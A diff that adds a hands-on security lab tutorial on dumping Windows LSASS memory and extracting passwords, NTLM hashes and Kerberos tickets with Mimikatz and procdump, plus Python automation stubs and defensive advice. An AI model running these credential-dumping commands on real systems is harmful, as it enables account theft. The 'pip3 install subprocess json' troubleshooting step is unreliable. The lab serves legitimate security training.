@@ -1,0 +1,456 @@
+Extract LSASS Memory Using Mimikatz
+Objectives
+By the end of this lab, students will be able to:
+
+Understand LSASS process and its role in Windows credential storage
+Create memory dumps of LSASS using Procdump
+Extract credentials from memory dumps using Mimikatz
+Automate credential extraction workflows with Python
+Implement security measures when handling sensitive data
+Prerequisites
+Basic understanding of Windows authentication mechanisms
+Familiarity with Linux command-line operations
+Python programming fundamentals
+Understanding of ethical hacking principles and legal considerations
+Lab Environment Setup
+Ready-to-Use Cloud Machines: Al Nafi provides Linux-based cloud machines with all necessary tools pre-installed. Click Start Lab to access your environment.
+
+Your lab environment includes:
+
+Ubuntu Linux with Wine for Windows tool compatibility
+Pre-installed Mimikatz and Procdump
+Python 3.x with required libraries
+Sample LSASS dump files
+Text editors and analysis tools
+Task 1: Understanding LSASS and Creating Memory Dumps
+Step 1.1: Explore the Lab Environment
+Navigate to the lab directory and examine available tools:
+
+# Navigate to lab directory
+cd /opt/mimikatz-lab
+
+# List available tools and samples
+ls -la tools/
+ls -la samples/
+
+# Verify Wine installation
+wine --version
+Step 1.2: Understand LSASS Process
+The Local Security Authority Subsystem Service (LSASS) handles:
+
+User authentication
+Password changes
+Access token creation
+Credential storage in memory
+View information about the sample dump:
+
+# Create working directory
+mkdir -p /opt/mimikatz-lab/dumps
+cd /opt/mimikatz-lab/dumps
+
+# Copy sample LSASS dump
+cp /opt/mimikatz-lab/samples/lsass_sample.dmp ./lsass.dmp
+
+# Examine dump file
+file lsass.dmp
+ls -lh lsass.dmp
+hexdump -C lsass.dmp | head -20
+Step 1.3: Understand Procdump Usage
+Procdump is a Microsoft Sysinternals tool for creating process memory dumps. In real scenarios, you would use:
+
+# Example command structure (for reference only)
+# procdump.exe -ma lsass.exe lsass.dmp
+
+# In this lab, we use pre-created samples for safety
+echo "Using sample dump file for educational purposes"
+Task 2: Extract Credentials Using Mimikatz
+Step 2.1: Set Up Mimikatz Environment
+Prepare directories and verify Mimikatz installation:
+
+# Navigate to tools directory
+cd /opt/mimikatz-lab/tools
+
+# Verify Mimikatz
+ls -la mimikatz.exe
+
+# Create output directory
+mkdir -p /opt/mimikatz-lab/output
+Step 2.2: Extract Logon Passwords
+Use Mimikatz to extract credentials from the memory dump:
+
+# Extract logon passwords
+wine mimikatz.exe "sekurlsa::minidump /opt/mimikatz-lab/dumps/lsass.dmp" "sekurlsa::logonpasswords" "exit" > /opt/mimikatz-lab/output/logon_passwords.txt
+
+# View extracted credentials
+cat /opt/mimikatz-lab/output/logon_passwords.txt | grep -A 5 "Username"
+Step 2.3: Extract Different Credential Types
+Create a script to extract multiple credential types:
+
+# Create extraction script
+cat > /opt/mimikatz-lab/extract_all.sh << 'EOF'
+#!/bin/bash
+
+DUMP="/opt/mimikatz-lab/dumps/lsass.dmp"
+OUT="/opt/mimikatz-lab/output"
+MIMIKATZ="/opt/mimikatz-lab/tools/mimikatz.exe"
+
+echo "Extracting credentials..."
+
+# Extract NTLM hashes
+wine $MIMIKATZ "sekurlsa::minidump $DUMP" "sekurlsa::msv" "exit" > "$OUT/ntlm_hashes.txt"
+
+# Extract Kerberos tickets
+wine $MIMIKATZ "sekurlsa::minidump $DUMP" "sekurlsa::tickets" "exit" > "$OUT/kerberos_tickets.txt"
+
+# Extract WDigest credentials
+wine $MIMIKATZ "sekurlsa::minidump $DUMP" "sekurlsa::wdigest" "exit" > "$OUT/wdigest_creds.txt"
+
+echo "Extraction complete!"
+EOF
+
+# Make executable and run
+chmod +x /opt/mimikatz-lab/extract_all.sh
+./extract_all.sh
+Step 2.4: Analyze Extracted Data
+Review the extracted credentials:
+
+# Count extracted credentials
+echo "=== CREDENTIAL SUMMARY ==="
+echo "Logon entries: $(grep -c "Username" /opt/mimikatz-lab/output/logon_passwords.txt)"
+echo "NTLM hashes: $(grep -c "NTLM" /opt/mimikatz-lab/output/ntlm_hashes.txt)"
+
+# View sample NTLM hashes
+grep -E "(Username|NTLM)" /opt/mimikatz-lab/output/ntlm_hashes.txt | head -10
+Task 3: Automate Credential Extraction with Python
+Step 3.1: Create Python Automation Framework
+Create a Python script template for automating Mimikatz operations:
+
+#!/usr/bin/env python3
+"""
+Mimikatz Automation Script
+Students: Complete the TODO sections to implement full functionality
+"""
+
+import os
+import subprocess
+import json
+from datetime import datetime
+
+class MimikatzAutomator:
+    def __init__(self, dump_file, output_dir):
+        self.dump_file = dump_file
+        self.output_dir = output_dir
+        self.mimikatz_path = "/opt/mimikatz-lab/tools/mimikatz.exe"
+        self.results = {}
+        
+    def run_mimikatz_command(self, commands, output_file):
+        """
+        Execute Mimikatz commands and save output.
+        
+        Args:
+            commands: List of Mimikatz commands to execute
+            output_file: Path to save command output
+            
+        Returns:
+            Command output as string or None on error
+        """
+        # TODO: Build command list with wine and mimikatz
+        # TODO: Execute subprocess with timeout
+        # TODO: Save output to file
+        # TODO: Return output string
+        pass
+    
+    def extract_logon_passwords(self):
+        """
+        Extract logon passwords from memory dump.
+        Students: Implement this method to extract and parse passwords
+        """
+        print("Extracting logon passwords...")
+        # TODO: Define Mimikatz commands for logon passwords
+        # TODO: Call run_mimikatz_command
+        # TODO: Parse output and store in self.results
+        pass
+    
+    def extract_ntlm_hashes(self):
+        """
+        Extract NTLM hashes from memory dump.
+        Students: Implement NTLM hash extraction
+        """
+        # TODO: Implement NTLM hash extraction
+        pass
+    
+    def parse_credentials(self, output, cred_type):
+        """
+        Parse Mimikatz output to extract structured credential data.
+        
+        Args:
+            output: Raw Mimikatz output text
+            cred_type: Type of credentials being parsed
+            
+        Returns:
+            List of credential dictionaries
+        """
+        # TODO: Split output into lines
+        # TODO: Parse username, domain, password/hash fields
+        # TODO: Return structured list of credentials
+        pass
+    
+    def generate_report(self):
+        """
+        Generate JSON report of extracted credentials.
+        Students: Complete report generation logic
+        """
+        # TODO: Create report dictionary with timestamp
+        # TODO: Include all extraction results
+        # TODO: Save to JSON file
+        # TODO: Return report object
+        pass
+    
+    def run_full_extraction(self):
+        """
+        Execute complete credential extraction workflow.
+        Students: Orchestrate all extraction methods
+        """
+        # TODO: Create output directory
+        # TODO: Call all extraction methods
+        # TODO: Generate final report
+        # TODO: Print summary
+        pass
+
+# Save this template to a file
+Save the template:
+
+cat > /opt/mimikatz-lab/mimikatz_automator.py << 'EOF'
+#!/usr/bin/env python3
+import os
+import subprocess
+import json
+from datetime import datetime
+
+class MimikatzAutomator:
+    def __init__(self, dump_file, output_dir):
+        self.dump_file = dump_file
+        self.output_dir = output_dir
+        self.mimikatz_path = "/opt/mimikatz-lab/tools/mimikatz.exe"
+        self.results = {}
+    
+    def run_mimikatz_command(self, commands, output_file):
+        # TODO: Implement command execution
+        pass
+    
+    def extract_logon_passwords(self):
+        # TODO: Implement password extraction
+        pass
+    
+    def extract_ntlm_hashes(self):
+        # TODO: Implement NTLM extraction
+        pass
+    
+    def generate_report(self):
+        # TODO: Implement report generation
+        pass
+    
+    def run_full_extraction(self):
+        # TODO: Implement full workflow
+        pass
+
+if __name__ == "__main__":
+    dump_file = "/opt/mimikatz-lab/dumps/lsass.dmp"
+    output_dir = "/opt/mimikatz-lab/output"
+    
+    automator = MimikatzAutomator(dump_file, output_dir)
+    # TODO: Call run_full_extraction and display results
+EOF
+
+chmod +x /opt/mimikatz-lab/mimikatz_automator.py
+Step 3.2: Create Credential Analysis Module
+Develop an analysis script template:
+
+#!/usr/bin/env python3
+"""
+Credential Analysis Module
+Students: Implement analysis functions to evaluate extracted credentials
+"""
+
+import json
+import re
+from collections import Counter
+
+class CredentialAnalyzer:
+    def __init__(self, report_file):
+        """Load extraction report for analysis"""
+        # TODO: Load JSON report file
+        pass
+    
+    def analyze_password_strength(self):
+        """
+        Analyze password patterns and strength metrics.
+        
+        Returns:
+            Dictionary with password analysis results
+        """
+        # TODO: Extract passwords from report
+        # TODO: Calculate metrics:
+        #   - Total and unique password count
+        #   - Password length distribution
+        #   - Passwords with digits/special chars
+        #   - Common password patterns
+        # TODO: Return analysis dictionary
+        pass
+    
+    def analyze_domains(self):
+        """
+        Analyze domain distribution in credentials.
+        Students: Implement domain analysis
+        """
+        # TODO: Extract domains from credentials
+        # TODO: Count unique domains
+        # TODO: Create domain distribution
+        pass
+    
+    def identify_privileged_accounts(self):
+        """
+        Identify potentially privileged accounts.
+        Students: Implement privileged account detection
+        """
+        # TODO: Search for admin-related usernames
+        # TODO: Identify service accounts
+        # TODO: Flag high-value targets
+        pass
+    
+    def generate_security_recommendations(self):
+        """
+        Generate security recommendations based on findings.
+        Students: Implement recommendation logic
+        """
+        # TODO: Analyze password strength results
+        # TODO: Check for weak passwords
+        # TODO: Identify policy violations
+        # TODO: Return list of recommendations
+        pass
+
+# Students: Implement the main execution block
+Step 3.3: Generate Comprehensive Reports
+Create a report generation template:
+
+#!/usr/bin/env python3
+"""
+Report Generator
+Students: Complete HTML report generation functionality
+"""
+
+def generate_html_report(extraction_data, analysis_data):
+    """
+    Generate HTML report from extraction and analysis data.
+    
+    Args:
+        extraction_data: Dictionary with extraction results
+        analysis_data: Dictionary with analysis results
+    """
+    # TODO: Create HTML template structure
+    # TODO: Populate with extraction summary
+    # TODO: Add analysis sections
+    # TODO: Include security recommendations
+    # TODO: Save to HTML file
+    pass
+
+def generate_csv_export(credentials):
+    """
+    Export credentials to CSV format.
+    Students: Implement CSV export functionality
+    """
+    # TODO: Create CSV with headers
+    # TODO: Write credential data
+    # TODO: Save to file
+    pass
+
+# Students: Implement main execution
+Expected Outcomes
+After completing this lab, you should have:
+
+Understanding of LSASS: Knowledge of how Windows stores credentials in memory
+Extraction Skills: Ability to use Mimikatz for credential extraction
+Automation Capability: Python scripts for automated credential extraction
+Analysis Skills: Methods to analyze and report on extracted credentials
+Security Awareness: Understanding of defensive measures and detection techniques
+Security Considerations
+Critical Warnings
+Legal Compliance: Only use on systems you own or have written authorization to test
+Data Protection: Handle extracted credentials securely and delete after analysis
+Network Isolation: Perform activities in isolated lab environments only
+Documentation: Maintain detailed logs for compliance and learning
+Defensive Measures
+Organizations should implement:
+
+Credential Guard: Prevents LSASS memory access
+LSA Protection: Makes LSASS a protected process
+Monitoring: Alert on unusual LSASS access attempts
+Regular Updates: Keep systems patched
+Privileged Access Management: Limit credential exposure
+Troubleshooting Tips
+Issue 1: Wine Compatibility Errors
+Symptom: Mimikatz fails to run under Wine
+
+Solution:
+
+# Reinstall Wine dependencies
+sudo dpkg --add-architecture i386
+sudo apt-get update
+sudo apt-get install wine32
+
+# Test Wine
+wine --version
+Issue 2: Permission Denied on Dump Files
+Symptom: Cannot read or write dump files
+
+Solution:
+
+# Fix permissions
+chmod 644 /opt/mimikatz-lab/dumps/*.dmp
+chmod 755 /opt/mimikatz-lab/output
+
+# Verify ownership
+ls -la /opt/mimikatz-lab/dumps/
+Issue 3: Python Script Execution Errors
+Symptom: Python scripts fail to execute
+
+Solution:
+
+# Ensure script is executable
+chmod +x /opt/mimikatz-lab/*.py
+
+# Check Python version
+python3 --version
+
+# Install missing modules if needed
+pip3 install --user subprocess json
+Issue 4: Empty or Corrupted Output
+Symptom: Mimikatz produces no output or corrupted data
+
+Solution:
+
+# Verify dump file integrity
+file /opt/mimikatz-lab/dumps/lsass.dmp
+
+# Check disk space
+df -h /opt/mimikatz-lab
+
+# Re-copy sample dump
+cp /opt/mimikatz-lab/samples/lsass_sample.dmp /opt/mimikatz-lab/dumps/lsass.dmp
+Conclusion
+This lab provided hands-on experience with LSASS memory extraction using Mimikatz. You learned to create memory dumps, extract various credential types, and automate the process with Python. Understanding these techniques is crucial for both offensive security testing and implementing defensive measures.
+
+Key Takeaways:
+
+LSASS stores credentials in memory, making it a high-value target
+Mimikatz can extract multiple credential types from memory dumps
+Automation improves efficiency and consistency in security testing
+Defensive measures like Credential Guard are essential protections
+Always operate within legal and ethical boundaries
+Next Steps:
+
+Complete the Python automation scripts
+Experiment with different Mimikatz commands
+Research additional defensive techniques
+Practice in authorized environments only
+Remember: These tools are powerful and must be used responsibly. Unauthorized access to computer systems is illegal and unethical. Use this knowledge to improve security, not compromise it.
